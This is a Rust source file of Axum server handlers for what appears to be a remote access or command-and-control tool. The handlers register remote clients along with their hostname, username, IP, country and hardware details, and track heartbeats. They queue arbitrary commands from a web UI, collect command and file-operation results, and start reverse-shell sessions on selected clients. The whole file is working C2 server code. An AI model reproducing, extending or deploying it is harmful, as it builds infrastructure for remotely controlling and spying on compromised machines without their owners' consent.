use crate::state::AppState;
use axum::{
    extract::{Path, State},
    http::StatusCode,
    Json,
};
use common::message::{ClientInfo, CommandRequest, CommandResponse, Message, ShellData};
use tracing::info;

/// Client registration handler
pub async fn register_client(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(client_info) = serde_json::from_slice::<ClientInfo>(&message.payload) {
        // Log the client connection and register the client in the client manager
        state.audit_logger.log_client_connect(&client_info);
        state.client_manager.register_client(client_info).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize client info for registration");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Heartbeat handler
pub async fn handle_heartbeat(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    // The payload for heartbeat is just the client_id as a string
    if let Ok(client_id) = String::from_utf8(message.payload) {
        state.client_manager.update_heartbeat(&client_id).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize client_id for heartbeat");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Get commands for a specific client
pub async fn get_commands(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<Json<Vec<CommandRequest>>, StatusCode> {
    let client_commands = state.client_manager.get_commands(&client_id).await;
    Ok(Json(client_commands))
}

/// Handle command result
pub async fn handle_command_result(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(result) = serde_json::from_slice::<CommandResponse>(&message.payload) {
        // Log the command result and add it to the client manager
        state.audit_logger.log_command_result(&result);
        state.client_manager.add_command_result(result).await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize command result");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Handle shell data from clients
pub async fn handle_shell_data(
    State(state): State<AppState>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    if let Ok(shell_data) = serde_json::from_slice::<ShellData>(&message.payload) {
        // Here you would typically forward this to a WebSocket or other real-time channel
        println!(
            "Received shell data from {}: {} bytes",
            shell_data.session_id,
            shell_data.data.len()
        );
        state
            .shell_manager
            .add_shell_data(
                &shell_data.session_id,
                String::from_utf8_lossy(&shell_data.data).to_string(),
            )
            .await;
        Ok(StatusCode::OK)
    } else {
        state
            .audit_logger
            .log_error("Failed to deserialize shell data");
        Err(StatusCode::BAD_REQUEST)
    }
}

/// Send command to a specific client (used by web UI)
pub async fn send_command(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(mut cmd): Json<CommandRequest>,
) -> Result<StatusCode, StatusCode> {
    cmd.client_id = client_id.clone();
    // Log the command execution and add it to the client manager
    state.audit_logger.log_command_execution(&cmd);
    state.client_manager.add_command(&client_id, cmd).await;
    Ok(StatusCode::OK)
}

/// Get all clients (used by web UI)
pub async fn api_clients(State(state): State<AppState>) -> Json<Vec<ClientInfo>> {
    let clients_vec = state.client_manager.get_clients().await;
    Json(clients_vec)
}

/// Get all clients with display info (used by web UI dashboard)
pub async fn api_clients_display(State(state): State<AppState>) -> Json<serde_json::Value> {
    let clients = state.client_manager.get_clients().await;
    let current_timestamp = chrono::Utc::now().timestamp();

    let display_clients: Vec<crate::handlers::web::DisplayClientInfo> = clients
        .into_iter()
        .map(|c| {
            let is_online =
                (current_timestamp - c.last_seen.timestamp()) < state.config.client_timeout as i64;
            crate::handlers::web::DisplayClientInfo {
                id: c.id,
                hostname: c.hostname,
                username: c.username,
                os: c.os,
                arch: c.arch,
                ip: c.ip,
                country_info: c.country_info,
                cpu_brand: c.cpu_brand,
                cpu_frequency: c.cpu_frequency,
                cpu_cores: c.cpu_cores,
                memory: c.memory,
                total_disk_space: c.total_disk_space,
                available_disk_space: c.available_disk_space,
                connected_at: c.connected_at,
                last_seen: c.last_seen,
                is_online,
            }
        })
        .collect();

    let online_clients_count = display_clients.iter().filter(|c| c.is_online).count();
    let os_types_count = display_clients
        .iter()
        .map(|c| c.os.as_str())
        .collect::<std::collections::HashSet<_>>()
        .len();

    Json(serde_json::json!({
        "clients": display_clients,
        "online_clients_count": online_clients_count,
        "os_types_count": os_types_count,
        "total_clients": display_clients.len()
    }))
}

/// Get command results for a specific client (used by web UI)
pub async fn api_command_results(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Json<Vec<CommandResponse>> {
    let results = state.client_manager.get_command_results(&client_id).await;
    Json(results)
}

/// Initiate a reverse shell for a specific client (used by web UI)
pub async fn initiate_reverse_shell(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
) -> Result<StatusCode, StatusCode> {
    // Create the shell session via the manager
    let session_id = state.shell_manager.create_session(&client_id).await;

    // Log the session creation
    if let Some(session) = state.shell_manager.get_session(&session_id).await {
        state.audit_logger.log_shell_session(&session);
    }

    // Create and send the reverse shell command
    let command = CommandRequest {
        client_id: client_id.clone(),
        command: "REVERSE_SHELL".to_string(),
        args: vec![session_id],
        message_id: None, // No event-driven response needed for reverse shell
    };

    state.audit_logger.log_command_execution(&command);
    state.client_manager.add_command(&client_id, command).await;

    Ok(StatusCode::OK)
}

/// Handle file operation response from clients
pub async fn handle_file_operation_response(
    State(state): State<AppState>,
    Path(client_id): Path<String>,
    Json(message): Json<Message>,
) -> Result<StatusCode, StatusCode> {
    info!(
        "Received file operation response from client {}: message_id={}, payload_size={}",
        client_id,
        message.id,
        message.payload.len()
    );

    // Log the payload for debugging
    if let Ok(payload_str) = String::from_utf8(message.payload.clone()) {
        info!("File operation response payload: {}", payload_str);
    }

    // Try event-driven notification first
    if state.notify_response(&message.id, message.clone()).await {
        info!(
            "Successfully notified event-driven listener for message {}",
            message.id
        );
    } else {
        // Fall back to legacy storage method
        state
            .client_manager
            .add_file_operation_response(&client_id, message)
            .await;
        info!(
            "Stored file operation response for client {} (legacy mode)",
            client_id
        );
    }

    Ok(StatusCode::OK)
}
